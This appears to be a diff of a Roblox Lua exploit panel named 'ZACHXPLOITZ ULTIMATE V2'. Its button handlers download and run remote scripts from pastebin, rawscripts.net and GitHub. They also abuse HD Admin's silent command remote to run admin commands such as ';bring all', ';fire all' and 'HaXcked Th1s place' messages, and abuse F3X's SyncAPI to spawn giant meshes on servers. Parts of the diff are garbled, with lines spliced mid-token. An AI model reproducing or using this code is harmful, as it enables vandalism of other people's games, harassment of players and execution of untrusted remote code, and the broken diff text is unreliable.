@@ -11,19 +11,18 @@ designed using localmaze gui creator
 
 local LMG2L = {};
 
-LMG2L["Gui_1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
-LMG2L["Gui_1"]["IgnoreGuiInset"] = true;
-LMG2L["Gui_1"]["ScreenInsets"] = Enum.ScreenInsets.DeviceSafeInsets;
-LMG2L["Gui_1"]["Name"] = [[Gui]];
-LMG2L["Gui_1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
-LMG2L["Gui_1"]["ResetOnSpawn"] = false;
+LMG2L["ScreenGui_1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
+LMG2L["ScreenGui_1"]["IgnoreGuiInset"] = true;
+LMG2L["ScreenGui_1"]["ScreenInsets"] = Enum.ScreenInsets.DeviceSafeInsets;
+LMG2L["ScreenGui_1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
+LMG2L["ScreenGui_1"]["ResetOnSpawn"] = false;
 
 
-LMG2L["Frame_2"] = Instance.new("Frame", LMG2L["Gui_1"]);
+LMG2L["Frame_2"] = Instance.new("Frame", LMG2L["ScreenGui_1"]);
 LMG2L["Frame_2"]["BorderSizePixel"] = 0;
 LMG2L["Frame_2"]["BackgroundColor3"] = Color3.fromRGB(9, 9, 9);
 LMG2L["Frame_2"]["Size"] = UDim2.new(0, 430, 0, 434);
-LMG2L["Frame_2"]["Position"] = UDim2.new(0, 248, 0, 22);
+LMG2L["Frame_2"]["Position"] = UDim2.new(0, 244, 0, 10);
 
 
 LMG2L["LocalScript_3"] = Instance.new("LocalScript", LMG2L["Frame_2"]);
@@ -47,7 +46,6 @@ LMG2L["LocalScript_5"] = Instance.new("LocalScript", LMG2L["Page 1_4"]);
 
 
 LMG2L["Frame2_6"] = Instance.new("Frame", LMG2L["Page 1_4"]);
-LMG2L["Frame2_6"]["Visible"] = false;
 LMG2L["Frame2_6"]["BorderSizePixel"] = 0;
 LMG2L["Frame2_6"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
 LMG2L["Frame2_6"]["Size"] = UDim2.new(0, 422, 0, 340);
@@ -59,7 +57,7 @@ LMG2L["ScrollingFrame_7"] = Instance.new("ScrollingFrame", LMG2L["Frame2_6"]);
 LMG2L["ScrollingFrame_7"]["BorderSizePixel"] = 2;
 LMG2L["ScrollingFrame_7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
 LMG2L["ScrollingFrame_7"]["Size"] = UDim2.new(0, 418, 0, 326);
-LMG2L["ScrollingFrame_7"]["Position"] = UDim2.new(0, 2, 0, 10);
+LMG2L["ScrollingFrame_7"]["Position"] = UDim2.new(0, 2, 0, 6);
 LMG2L["ScrollingFrame_7"]["BorderColor3"] = Color3.fromRGB(80, 27, 255);
 LMG2L["ScrollingFrame_7"]["BackgroundTransparency"] = 1;
 
@@ -787,7 +785,6 @@ LMG2L["LocalScript_69"] = Instance.new("LocalScript", LMG2L["Page 2_68"]);
 
 
 LMG2L["Frame3_6a"] = Instance.new("Frame", LMG2L["Page 2_68"]);
-LMG2L["Frame3_6a"]["Visible"] = false;
 LMG2L["Frame3_6a"]["BorderSizePixel"] = 0;
 LMG2L["Frame3_6a"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
 LMG2L["Frame3_6a"]["Size"] = UDim2.new(0, 422, 0, 344);
@@ -798,7 +795,7 @@ LMG2L["Frame3_6a"]["Name"] = [[Frame3]];
 LMG2L["ScrollingFrame_6b"] = Instance.new("ScrollingFrame", LMG2L["Frame3_6a"]);
 LMG2L["ScrollingFrame_6b"]["BorderSizePixel"] = 2;
 LMG2L["ScrollingFrame_6b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-LMG2L["ScrollingFrame_6b"]["Size"] = UDim2.new(0, 414, 0, 330);
+LMG2L["ScrollingFrame_6b"]["Size"] = UDim2.new(0, 418, 0, 330);
 LMG2L["ScrollingFrame_6b"]["Position"] = UDim2.new(0, 4, 0, 8);
 LMG2L["ScrollingFrame_6b"]["BorderColor3"] = Color3.fromRGB(34, 18, 255);
 LMG2L["ScrollingFrame_6b"]["BackgroundTransparency"] = 1;
@@ -1381,8 +1378,8 @@ LMG2L["Frame1_ba"] = Instance.new("Frame", LMG2L["Home_b8"]);
 LMG2L["Frame1_ba"]["ZIndex"] = 2;
 LMG2L["Frame1_ba"]["BorderSizePixel"] = 0;
 LMG2L["Frame1_ba"]["BackgroundColor3"] = Color3.fromRGB(7, 7, 7);
-LMG2L["Frame1_ba"]["Size"] = UDim2.new(0, 428, 0, 356);
-LMG2L["Frame1_ba"]["Position"] = UDim2.new(0, -438, 0, 76);
+LMG2L["Frame1_ba"]["Size"] = UDim2.new(0, 422, 0, 352);
+LMG2L["Frame1_ba"]["Position"] = UDim2.new(0, -434, 0, 76);
 LMG2L["Frame1_ba"]["Name"] = [[Frame1]];
 
 
@@ -1464,10 +1461,502 @@ LMG2L["Get F3x_c5"]["BorderSizePixel"] = 0;
 LMG2L["Get F3x_c5"]["TextSize"] = 24;
 LMG2L["Get F3x_c5"]["TextScaled"] = true;
 LMG2L["Get F3x_c5"]["TextColor3"] = Color3.fromRGB(35, 19, 255);
-LMG2L["Get F3x_c5"]["BackgitForChild("HDAdminHDClient")	
+LMG2L["Get F3x_c5"]["BackgroundColor3"] = Color3.fromRGB(9, 9, 9);
+LMG2L["Get F3x_c5"]["Size"] = UDim2.new(0, 78, 0, 34);
+LMG2L["Get F3x_c5"]["Text"] = [[Get F3x]];
+LMG2L["Get F3x_c5"]["Name"] = [[Get F3x]];
+LMG2L["Get F3x_c5"]["Position"] = UDim2.new(0, 6, 0, 2);
+
+
+LMG2L["LocalScript_c6"] = Instance.new("LocalScript", LMG2L["Get F3x_c5"]);
+
+
+
+LMG2L["UIStroke_c7"] = Instance.new("UIStroke", LMG2L["Get F3x_c5"]);
+LMG2L["UIStroke_c7"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+LMG2L["UIStroke_c7"]["Color"] = Color3.fromRGB(46, 30, 255);
+
+
+LMG2L["ImageLabel_c8"] = Instance.new("ImageLabel", LMG2L["Frame_2"]);
+LMG2L["ImageLabel_c8"]["BorderSizePixel"] = 0;
+LMG2L["ImageLabel_c8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+-- LMG2L["ImageLabel_c8"]["ImageContent"] = ;
+LMG2L["ImageLabel_c8"]["Image"] = [[rbxassetid://79440497150256]];
+LMG2L["ImageLabel_c8"]["Size"] = UDim2.new(0, 128, 0, 100);
+LMG2L["ImageLabel_c8"]["Position"] = UDim2.new(0, 440, 0, 334);
+
+
+LMG2L["R6_c9"] = Instance.new("TextButton", LMG2L["Frame_2"]);
+LMG2L["R6_c9"]["TextWrapped"] = true;
+LMG2L["R6_c9"]["BorderSizePixel"] = 0;
+LMG2L["R6_c9"]["TextSize"] = 24;
+LMG2L["R6_c9"]["TextScaled"] = true;
+LMG2L["R6_c9"]["TextColor3"] = Color3.fromRGB(35, 19, 255);
+LMG2L["R6_c9"]["BackgroundColor3"] = Color3.fromRGB(9, 9, 9);
+LMG2L["R6_c9"]["Size"] = UDim2.new(0, 68, 0, 26);
+LMG2L["R6_c9"]["Text"] = [[R6]];
+LMG2L["R6_c9"]["Name"] = [[R6]];
+LMG2L["R6_c9"]["Position"] = UDim2.new(0, 358, 0, 4);
+
+
+LMG2L["LocalScript_ca"] = Instance.new("LocalScript", LMG2L["R6_c9"]);
+
+
+
+LMG2L["UIStroke_cb"] = Instance.new("UIStroke", LMG2L["R6_c9"]);
+LMG2L["UIStroke_cb"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+LMG2L["UIStroke_cb"]["Color"] = Color3.fromRGB(46, 30, 255);
+
+
+LMG2L["TextLabel_cc"] = Instance.new("TextLabel", LMG2L["Frame_2"]);
+LMG2L["TextLabel_cc"]["TextWrapped"] = true;
+LMG2L["TextLabel_cc"]["BorderSizePixel"] = 0;
+LMG2L["TextLabel_cc"]["TextScaled"] = true;
+LMG2L["TextLabel_cc"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["TextLabel_cc"]["TextColor3"] = Color3.fromRGB(61, 36, 255);
+LMG2L["TextLabel_cc"]["BackgroundTransparency"] = 1;
+LMG2L["TextLabel_cc"]["Size"] = UDim2.new(0, 250, 0, 44);
+LMG2L["TextLabel_cc"]["Text"] = [[ZACHXPLOITZ ULTIMATE V2]];
+LMG2L["TextLabel_cc"]["Position"] = UDim2.new(0, 100, 0, 4);
+
+
+LMG2L["LocalScript_cd"] = Instance.new("LocalScript", LMG2L["TextLabel_cc"]);
+
+
+
+LMG2L["LocalScript2_ce"] = Instance.new("LocalScript", LMG2L["TextLabel_cc"]);
+LMG2L["LocalScript2_ce"]["Name"] = [[LocalScript2]];
+
+
+LMG2L["UIStroke_cf"] = Instance.new("UIStroke", LMG2L["TextLabel_cc"]);
+LMG2L["UIStroke_cf"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+LMG2L["UIStroke_cf"]["Thickness"] = 2;
+LMG2L["UIStroke_cf"]["Color"] = Color3.fromRGB(18, 28, 216);
+
+
+LMG2L["R15_d0"] = Instance.new("TextButton", LMG2L["Frame_2"]);
+LMG2L["R15_d0"]["TextWrapped"] = true;
+LMG2L["R15_d0"]["BorderSizePixel"] = 0;
+LMG2L["R15_d0"]["TextSize"] = 24;
+LMG2L["R15_d0"]["TextScaled"] = true;
+LMG2L["R15_d0"]["TextColor3"] = Color3.fromRGB(35, 19, 255);
+LMG2L["R15_d0"]["BackgroundColor3"] = Color3.fromRGB(9, 9, 9);
+LMG2L["R15_d0"]["Size"] = UDim2.new(0, 68, 0, 26);
+LMG2L["R15_d0"]["Text"] = [[R15]];
+LMG2L["R15_d0"]["Name"] = [[R15]];
+LMG2L["R15_d0"]["Position"] = UDim2.new(0, 358, 0, 34);
+
+
+LMG2L["LocalScript_d1"] = Instance.new("LocalScript", LMG2L["R15_d0"]);
+
+
+
+LMG2L["UIStroke_d2"] = Instance.new("UIStroke", LMG2L["R15_d0"]);
+LMG2L["UIStroke_d2"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+LMG2L["UIStroke_d2"]["Color"] = Color3.fromRGB(46, 30, 255);
+
+
+LMG2L["UIDragDetector_d3"] = Instance.new("UIDragDetector", LMG2L["Frame_2"]);
+LMG2L["UIDragDetector_d3"]["DragUDim2"] = UDim2.new(0, -45, 0, 38);
+
+
+LMG2L["Refresh Me_d4"] = Instance.new("TextButton", LMG2L["Frame_2"]);
+LMG2L["Refresh Me_d4"]["TextWrapped"] = true;
+LMG2L["Refresh Me_d4"]["BorderSizePixel"] = 0;
+LMG2L["Refresh Me_d4"]["TextSize"] = 24;
+LMG2L["Refresh Me_d4"]["TextScaled"] = true;
+LMG2L["Refresh Me_d4"]["TextColor3"] = Color3.fromRGB(35, 19, 255);
+LMG2L["Refresh Me_d4"]["BackgroundColor3"] = Color3.fromRGB(9, 9, 9);
+LMG2L["Refresh Me_d4"]["Size"] = UDim2.new(0, 78, 0, 30);
+LMG2L["Refresh Me_d4"]["Text"] = [[Re]];
+LMG2L["Refresh Me_d4"]["Name"] = [[Refresh Me]];
+LMG2L["Refresh Me_d4"]["Position"] = UDim2.new(0, 6, 0, 40);
+
+
+LMG2L["LocalScript_d5"] = Instance.new("LocalScript", LMG2L["Refresh Me_d4"]);
+
+
+
+LMG2L["UIStroke_d6"] = Instance.new("UIStroke", LMG2L["Refresh Me_d4"]);
+LMG2L["UIStroke_d6"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+LMG2L["UIStroke_d6"]["Color"] = Color3.fromRGB(46, 30, 255);
+
+
+local function C_3()
+	local script = LMG2L["LocalScript_3"];
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/Zaxh69/Project/refs/heads/main/ZachXploitzLogo.txt"))()	
+end;
+task.spawn(C_3);
+local function C_5()
+	local script = LMG2L["LocalScript_5"];
+	local button = script.Parent	
+	local mainFrame = button.Parent	
+	
+	local myFrame = button:WaitForChild("Frame2")	
+	
+	button.MouseButton1Click:Connect(function()	
+		for _, obj in ipairs(mainFrame:GetDescendants()) do	
+			if obj:IsA("Frame") then	
+				obj.Visible = false	
+			end	
+		end	
+			
+		myFrame.Visible = true	
+	end)	
+end;
+task.spawn(C_5);
+local function C_9()
+	local script = LMG2L["LocalScript_9"];
+	local Button = script.Parent	
+	
+	Button.MouseButton1Click:Connect(function()	
+		loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-John-Doe-F3X-Script-86500"))()	
+	end)	
+end;
+task.spawn(C_9);
+local function C_c()
+	local script = LMG2L["LocalScript_c"];
+	local button = script.Parent	
+	
+	button.MouseButton1Click:Connect(function()	
+	loadstring(game:HttpGet("https://pastebin.com/3EV59jLS"))()	
+	end)	
+end;
+task.spawn(C_c);
+local function C_f()
+	local script = LMG2L["LocalScript_f"];
+	local Button = script.Parent	
+	
+	Button.MouseButton1Click:Connect(function()	
+		local player = game.Players.LocalPlayer	
+		local char = player.Character or player.CharacterAdded:Wait()	
+		local tool	
+	
+		for _, v in player:GetDescendants() do	
+			if v.Name == "SyncAPI" then	
+				tool = v.Parent	
+			end	
+		end	
+	
+		for _, v in game.ReplicatedStorage:GetDescendants() do	
+			if v.Name == "SyncAPI" then	
+				tool = v.Parent	
+			end	
+		end	
+	
+		if not tool then return end	
+	
+		local remote = tool.SyncAPI.ServerEndpoint	
+	
+		local function _(args)	
+			remote:InvokeServer(unpack(args))	
+		end	
+	
+		local function CreatePart(cf, parent)	
+			_({"CreatePart","Normal",cf,parent})	
+		end	
+	
+		local function SetAnchor(part, state)	
+			_({"SyncAnchor",{{Part = part, Anchored = state}}})	
+		end	
+	
+		local function AddMesh(part)	
+			_({"CreateMeshes",{{Part = part}}})	
+		end	
+	
+		local function SetMesh(part, meshid)	
+			_({"SyncMesh",{{Part = part, MeshId = "rbxassetid://"..meshid}}})	
+		end	
+	
+		local function SetTexture(part, texid)	
+			_({"SyncMesh",{{Part = part, TextureId = "rbxassetid://"..texid}}})	
+		end	
+	
+		local function MeshResize(part, size)	
+			_({"SyncMesh",{{Part = part, Scale = size}}})	
+		end	
+	
+		local function Sky(id)	
+			local hrp = char:WaitForChild("HumanoidRootPart")	
+			local pos = hrp.Position + Vector3.new(0,6,0)	
+	
+			CreatePart(CFrame.new(pos), workspace)	
+	
+			for _, v in workspace:GetDescendants() do	
+				if v:IsA("BasePart") and (v.Position - pos).Magnitude < 0.1 then	
+					SetAnchor(v,true)	
+					AddMesh(v)	
+					SetMesh(v,111891702759441)	
+					SetTexture(v,id)	
+					MeshResize(v,Vector3.new(8000,8000,8000))	
+				end	
+			end	
+		end	
+	
+		Sky("84437077150729")	
+	end)	
+end;
+task.spawn(C_f);
+local function C_12()
+	local script = LMG2L["LocalScript_12"];
+	local Button = script.Parent	
+	
+	Button.MouseButton1Click:Connect(function()	
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")	
+		local hd = ReplicatedStorage:WaitForChild("HDAdminHDClient")	
 		local RequestCommand = hd.Signals.RequestCommandSilent	
 	
-		RequestCommand:InvokeServer(";sh ZachXploitz Fe Bypass Th1s Pl4cez LMAOFFF")	
+		RequestCommand:InvokeServer(";bring all")	
+	end)	
+end;
+task.spawn(C_12);
+local function C_15()
+	local script = LMG2L["LocalScript_15"];
+	local Button = script.Parent	
+	
+	Button.MouseButton1Click:Connect(function()	
+	loadstring(game:HttpGet("https://pastebin.com/raw/MjRdFbN7"))()	
+	end)	
+end;
+task.spawn(C_15);
+local function C_18()
+	local script = LMG2L["LocalScript_18"];
+	local Button = script.Parent	
+	
+	Button.MouseButton1Click:Connect(function()	
+		loadstring(game:HttpGet("https://pastebin.com/raw/8msENFDp"))()	
+	end)	
+end;
+task.spawn(C_18);
+local function C_1b()
+	local script = LMG2L["LocalScript_1b"];
+	local Button = script.Parent	
+	
+	Button.MouseButton1Click:Connect(function()	
+			local player = game.Players.LocalPlayer	
+		local char = player.Character or player.CharacterAdded:Wait()	
+		local tool	
+	
+		for _, v in player:GetDescendants() do	
+			if v.Name == "SyncAPI" then	
+				tool = v.Parent	
+			end	
+		end	
+	
+		for _, v in game.ReplicatedStorage:GetDescendants() do	
+			if v.Name == "SyncAPI" then	
+				tool = v.Parent	
+			end	
+		end	
+	
+		if not tool then return end	
+	
+		local remote = tool.SyncAPI.ServerEndpoint	
+	
+		local function _(args)	
+			remote:InvokeServer(unpack(args))	
+		end	
+	
+		local function CreatePart(cf, parent)	
+			_({"CreatePart","Normal",cf,parent})	
+		end	
+	
+		local function SetAnchor(part, state)	
+			_({"SyncAnchor",{{Part = part, Anchored = state}}})	
+		end	
+	
+		local function AddMesh(part)	
+			_({"CreateMeshes",{{Part = part}}})	
+		end	
+	
+		local function SetMesh(part, meshid)	
+			_({"SyncMesh",{{Part = part, MeshId = "rbxassetid://"..meshid}}})	
+		end	
+	
+		local function SetTexture(part, texid)	
+			_({"SyncMesh",{{Part = part, TextureId = "rbxassetid://"..texid}}})	
+		end	
+	
+		local function MeshResize(part, size)	
+			_({"SyncMesh",{{Part = part, Scale = size}}})	
+		end	
+	
+		local function Sky(id)	
+			local hrp = char:WaitForChild("HumanoidRootPart")	
+			local pos = hrp.Position + Vector3.new(0,6,0)	
+	
+			CreatePart(CFrame.new(pos), workspace)	
+	
+			for _, v in workspace:GetDescendants() do	
+				if v:IsA("BasePart") and (v.Position - pos).Magnitude < 0.1 then	
+					SetAnchor(v,true)	
+					AddMesh(v)	
+					SetMesh(v,111891702759441)	
+					SetTexture(v,id)	
+					MeshResize(v,Vector3.new(8000,8000,8000))	
+				end	
+			end	
+		end	
+	
+		Sky("79440497150256")	
+	end)	
+end;
+task.spawn(C_1b);
+local function C_1e()
+	local script = LMG2L["LocalScript_1e"];
+	local Button = script.Parent	
+	
+	Button.MouseButton1Click:Connect(function()	
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")	
+		local hd = ReplicatedStorage:WaitForChild("HDAdminHDClient")	
+		local RequestCommand = hd.Signals.RequestCommandSilent	
+	
+		RequestCommand:InvokeServer(";name all ZachXploitz")	
+	end)	
+end;
+task.spawn(C_1e);
+local function C_21()
+	local script = LMG2L["LocalScript_21"];
+	local button = script.Parent	
+	
+	button.MouseButton1Click:Connect(function()	
+	loadstring(game:HttpGet("https://pastebin.com/raw/7t1TS2z1"))()	
+	end)	
+end;
+task.spawn(C_21);
+local function C_24()
+	local script = LMG2L["LocalScript_24"];
+	local Button = script.Parent	
+	
+	Button.MouseButton1Click:Connect(function()	
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")	
+		local hd = ReplicatedStorage:WaitForChild("HDAdminHDClient")	
+		local RequestCommand = hd.Signals.RequestCommandSilent	
+	
+		RequestCommand:InvokeServer(";disco ;time 0  ;fog 400")	
+	end)	
+end;
+task.spawn(C_24);
+local function C_27()
+	local script = LMG2L["LocalScript_27"];
+	local Button = script.Parent	
+	
+	Button.MouseButton1Click:Connect(function()	
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")	
+		local hd = ReplicatedStorage:WaitForChild("HDAdminHDClient")	
+		local RequestCommand = hd.Signals.RequestCommandSilent	
+	
+		RequestCommand:InvokeServer(";cmdbar2")	
+	end)	
+end;
+task.spawn(C_27);
+local function C_2a()
+	local script = LMG2L["LocalScript_2a"];
+	local Button = script.Parent	
+	
+	Button.MouseButton1Click:Connect(function()	
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")	
+		local hd = ReplicatedStorage:WaitForChild("HDAdminHDClient")	
+		local RequestCommand = hd.Signals.RequestCommandSilent	
+	
+		RequestCommand:InvokeServer(";sm ZachXploitz HaXcked Th1s place!!")	
+	end)	
+end;
+task.spawn(C_2a);
+local function C_2d()
+	local script = LMG2L["LocalScript_2d"];
+	local Button = script.Parent	
+	
+	Button.MouseButton1Click:Connect(function()	
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")	
+		local hd = ReplicatedStorage:WaitForChild("HDAdminHDClient")	
+		local RequestCommand = hd.Signals.RequestCommandSilent	
+	
+		RequestCommand:InvokeServer(";createTeam blue ZachXploitz")	
+	    RequestCommand:InvokeServer(";team all ZachXploitz")	
+	end)	
+end;
+task.spawn(C_2d);
+local function C_30()
+	local script = LMG2L["LocalScript_30"];
+	local Button = script.Parent	
+	
+	Button.MouseButton1Click:Connect(function()	
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")	
+		local hd = ReplicatedStorage:WaitForChild("HDAdminHDClient")	
+		local RequestCommand = hd.Signals.RequestCommandSilent	
+	
+		RequestCommand:InvokeServer(";time 10")	
+	end)	
+end;
+task.spawn(C_30);
+local function C_33()
+	local script = LMG2L["LocalScript_33"];
+	local button = script.Parent	
+	
+	button.MouseButton1Click:Connect(function()	
+	loadstring(game:HttpGet("https://pastebin.com/raw/zg8JUa13"))()	
+	end)	
+end;
+task.spawn(C_33);
+local function C_36()
+	local script = LMG2L["LocalScript_36"];
+	local Button = script.Parent	
+	
+	Button.MouseButton1Click:Connect(function()	
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")	
+		local hd = ReplicatedStorage:WaitForChild("HDAdminHDClient")	
+		local RequestCommand = hd.Signals.RequestCommandSilent	
+	
+		RequestCommand:InvokeServer(";gear me 116693764")	
+	end)	
+end;
+task.spawn(C_36);
+local function C_39()
+	local script = LMG2L["LocalScript_39"];
+	local Button = script.Parent	
+	
+	Button.MouseButton1Click:Connect(function()	
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")	
+		local hd = ReplicatedStorage:WaitForChild("HDAdminHDClient")	
+		local RequestCommand = hd.Signals.RequestCommandSilent	
+	
+		RequestCommand:InvokeServer(";fire all")	
+	end)	
+end;
+task.spawn(C_39);
+local function C_3c()
+	local script = LMG2L["LocalScript_3c"];
+	local Button = script.Parent	
+	
+	Button.MouseButton1Click:Connect(function()	
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")	
+		local hd = ReplicatedStorage:WaitForChild("HDAdminHDClient")	
+		local RequestCommand = hd.Signals.RequestCommandSilent	
+	
+		RequestCommand:InvokeServer(";char all KyuKusangaki")	
+	end)	
+end;
+task.spawn(C_3c);
+local function C_3f()
+	local script = LMG2L["LocalScript_3f"];
+	local button = script.Parent	
+	
+	button.MouseButton1Click:Connect(function()	
+		loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-mesh-disco-f3x-client-sided-93981"))()	
+	end)	
+end;
+task.spawn(C_3f);
+local function C_42()
+	local script = LMG2L["LocalScript_42"];
+	local Button = script.Parent	
+	
+	Button.MouseButton1Click:Connect(function()	
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")	
+		local hd = ReplicatedStorage:WaitForChild("HDAdminHDClient")	
+		local RequestCommand = hd.Signals.RequestCommandSilent	
+	
+		RequestCommand:InvokeServer(";sh ZachXploitz Was Here L0lzz!!!")	
 	end)	
 end;
 task.spawn(C_42);
@@ -2101,499 +2590,7 @@ local function C_7f()
 		local hd = ReplicatedStorage:WaitForChild("HDAdminHDClient")	
 		local RequestCommand = hd.Signals.RequestCommandSilent	
 	
-		RequestCommand:InvokeServer(";music 1839246774 ;pitch 1.1 ;volume inf"roundColor3"] = Color3.fromRGB(9, 9, 9);
-LMG2L["Get F3x_c5"]["Size"] = UDim2.new(0, 78, 0, 34);
-LMG2L["Get F3x_c5"]["Text"] = [[Get F3x]];
-LMG2L["Get F3x_c5"]["Name"] = [[Get F3x]];
-LMG2L["Get F3x_c5"]["Position"] = UDim2.new(0, 6, 0, 2);
-
-
-LMG2L["LocalScript_c6"] = Instance.new("LocalScript", LMG2L["Get F3x_c5"]);
-
-
-
-LMG2L["UIStroke_c7"] = Instance.new("UIStroke", LMG2L["Get F3x_c5"]);
-LMG2L["UIStroke_c7"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
-LMG2L["UIStroke_c7"]["Color"] = Color3.fromRGB(46, 30, 255);
-
-
-LMG2L["ImageLabel_c8"] = Instance.new("ImageLabel", LMG2L["Frame_2"]);
-LMG2L["ImageLabel_c8"]["BorderSizePixel"] = 0;
-LMG2L["ImageLabel_c8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
--- LMG2L["ImageLabel_c8"]["ImageContent"] = ;
-LMG2L["ImageLabel_c8"]["Image"] = [[rbxassetid://79440497150256]];
-LMG2L["ImageLabel_c8"]["Size"] = UDim2.new(0, 128, 0, 100);
-LMG2L["ImageLabel_c8"]["Position"] = UDim2.new(0, 440, 0, 334);
-
-
-LMG2L["R6_c9"] = Instance.new("TextButton", LMG2L["Frame_2"]);
-LMG2L["R6_c9"]["TextWrapped"] = true;
-LMG2L["R6_c9"]["BorderSizePixel"] = 0;
-LMG2L["R6_c9"]["TextSize"] = 24;
-LMG2L["R6_c9"]["TextScaled"] = true;
-LMG2L["R6_c9"]["TextColor3"] = Color3.fromRGB(35, 19, 255);
-LMG2L["R6_c9"]["BackgroundColor3"] = Color3.fromRGB(9, 9, 9);
-LMG2L["R6_c9"]["Size"] = UDim2.new(0, 68, 0, 26);
-LMG2L["R6_c9"]["Text"] = [[R6]];
-LMG2L["R6_c9"]["Name"] = [[R6]];
-LMG2L["R6_c9"]["Position"] = UDim2.new(0, 358, 0, 4);
-
-
-LMG2L["LocalScript_ca"] = Instance.new("LocalScript", LMG2L["R6_c9"]);
-
-
-
-LMG2L["UIStroke_cb"] = Instance.new("UIStroke", LMG2L["R6_c9"]);
-LMG2L["UIStroke_cb"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
-LMG2L["UIStroke_cb"]["Color"] = Color3.fromRGB(46, 30, 255);
-
-
-LMG2L["TextLabel_cc"] = Instance.new("TextLabel", LMG2L["Frame_2"]);
-LMG2L["TextLabel_cc"]["TextWrapped"] = true;
-LMG2L["TextLabel_cc"]["BorderSizePixel"] = 0;
-LMG2L["TextLabel_cc"]["TextScaled"] = true;
-LMG2L["TextLabel_cc"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-LMG2L["TextLabel_cc"]["TextColor3"] = Color3.fromRGB(61, 36, 255);
-LMG2L["TextLabel_cc"]["BackgroundTransparency"] = 1;
-LMG2L["TextLabel_cc"]["Size"] = UDim2.new(0, 250, 0, 44);
-LMG2L["TextLabel_cc"]["Text"] = [[ZACHXPLOITZ ULTIMATE V2]];
-LMG2L["TextLabel_cc"]["Position"] = UDim2.new(0, 100, 0, 4);
-
-
-LMG2L["LocalScript_cd"] = Instance.new("LocalScript", LMG2L["TextLabel_cc"]);
-
-
-
-LMG2L["LocalScript2_ce"] = Instance.new("LocalScript", LMG2L["TextLabel_cc"]);
-LMG2L["LocalScript2_ce"]["Name"] = [[LocalScript2]];
-
-
-LMG2L["UIStroke_cf"] = Instance.new("UIStroke", LMG2L["TextLabel_cc"]);
-LMG2L["UIStroke_cf"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
-LMG2L["UIStroke_cf"]["Thickness"] = 2;
-LMG2L["UIStroke_cf"]["Color"] = Color3.fromRGB(18, 28, 216);
-
-
-LMG2L["R15_d0"] = Instance.new("TextButton", LMG2L["Frame_2"]);
-LMG2L["R15_d0"]["TextWrapped"] = true;
-LMG2L["R15_d0"]["BorderSizePixel"] = 0;
-LMG2L["R15_d0"]["TextSize"] = 24;
-LMG2L["R15_d0"]["TextScaled"] = true;
-LMG2L["R15_d0"]["TextColor3"] = Color3.fromRGB(35, 19, 255);
-LMG2L["R15_d0"]["BackgroundColor3"] = Color3.fromRGB(9, 9, 9);
-LMG2L["R15_d0"]["Size"] = UDim2.new(0, 68, 0, 26);
-LMG2L["R15_d0"]["Text"] = [[R15]];
-LMG2L["R15_d0"]["Name"] = [[R15]];
-LMG2L["R15_d0"]["Position"] = UDim2.new(0, 358, 0, 34);
-
-
-LMG2L["LocalScript_d1"] = Instance.new("LocalScript", LMG2L["R15_d0"]);
-
-
-
-LMG2L["UIStroke_d2"] = Instance.new("UIStroke", LMG2L["R15_d0"]);
-LMG2L["UIStroke_d2"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
-LMG2L["UIStroke_d2"]["Color"] = Color3.fromRGB(46, 30, 255);
-
-
-LMG2L["UIDragDetector_d3"] = Instance.new("UIDragDetector", LMG2L["Frame_2"]);
-LMG2L["UIDragDetector_d3"]["DragUDim2"] = UDim2.new(0, -45, 0, 38);
-
-
-LMG2L["Refresh Me_d4"] = Instance.new("TextButton", LMG2L["Frame_2"]);
-LMG2L["Refresh Me_d4"]["TextWrapped"] = true;
-LMG2L["Refresh Me_d4"]["BorderSizePixel"] = 0;
-LMG2L["Refresh Me_d4"]["TextSize"] = 24;
-LMG2L["Refresh Me_d4"]["TextScaled"] = true;
-LMG2L["Refresh Me_d4"]["TextColor3"] = Color3.fromRGB(35, 19, 255);
-LMG2L["Refresh Me_d4"]["BackgroundColor3"] = Color3.fromRGB(9, 9, 9);
-LMG2L["Refresh Me_d4"]["Size"] = UDim2.new(0, 78, 0, 30);
-LMG2L["Refresh Me_d4"]["Text"] = [[Re]];
-LMG2L["Refresh Me_d4"]["Name"] = [[Refresh Me]];
-LMG2L["Refresh Me_d4"]["Position"] = UDim2.new(0, 6, 0, 40);
-
-
-LMG2L["LocalScript_d5"] = Instance.new("LocalScript", LMG2L["Refresh Me_d4"]);
-
-
-
-LMG2L["UIStroke_d6"] = Instance.new("UIStroke", LMG2L["Refresh Me_d4"]);
-LMG2L["UIStroke_d6"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
-LMG2L["UIStroke_d6"]["Color"] = Color3.fromRGB(46, 30, 255);
-
-
-local function C_3()
